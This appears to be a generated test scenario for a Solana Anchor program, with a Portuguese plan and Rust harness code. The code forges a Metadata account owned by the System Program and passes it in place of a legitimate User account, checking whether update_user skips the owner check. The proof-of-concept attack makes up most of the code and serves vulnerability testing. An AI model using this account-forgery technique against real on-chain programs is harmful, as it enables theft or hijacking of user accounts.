{
  "plan": "O cenário monta uma conta `user` legítima pertencente ao programa com dados de `User` (authority = carteira do atacante) e uma conta forjada `Metadata` com o mesmo layout de 32 bytes, mas dono diferente (ex.: System Program). O baseline chama `update_user` com a conta legítima e a autoridade correta, provando que o cenário está correto. O ataque chama a mesma instrução substituindo a conta `user` pela conta forjada `Metadata`, cujo campo `account` é definido como a chave da autoridade para que a desserialização e a comparação de authority passem. O efeito mede que a conta forjada foi aceita e usada: o dono da conta `user` após a execução é diferente do program_id (ou seja, a checagem de owner não impediu o uso dos dados forjados).",
  "scenario": "let authority = Pubkey::new_unique();
let user_key = Pubkey::new_unique();
let forged_key = Pubkey::new_unique();

// Conta legítima: dono é o programa, dados de User com authority = authority
let legit_user_data = anchor_account_data("User", &(authority,));
let legit_user = account(&env.program_id, &legit_user_data, None);

// Conta forjada: dono é o System Program, dados de Metadata com account = authority
let forged_data = anchor_account_data("Metadata", &(authority,));
let forged_user = account(&solana_sdk::system_program::id(), &forged_data, None);

let authority_account = wallet(1_000_000_000);

// Baseline: uso legítimo com a conta correta
let ix_baseline = env.anchor_ix(
    "update_user",
    &(),
    vec![
        AccountMeta::new_readonly(user_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_baseline = vec![
    (user_key, legit_user.clone()),
    (authority, authority_account.clone()),
];
let r_base = env.baseline("update_user legitimo", &ix_baseline, &contas_baseline);

// Ataque: substitui a conta user pela conta forjada (dono diferente)
let ix_attack = env.anchor_ix(
    "update_user",
    &(),
    vec![
        AccountMeta::new_readonly(forged_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_attack = vec![
    (forged_key, forged_user.clone()),
    (authority, authority_account.clone()),
];
let r = env.attack("update_user com conta forjada", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let owner_after = after(&r, &forged_key).owner();
    env.effect(
        "conta forjada (dono != program_id) foi aceita e usada",
        owner_after != env.program_id,
    );
}"
}

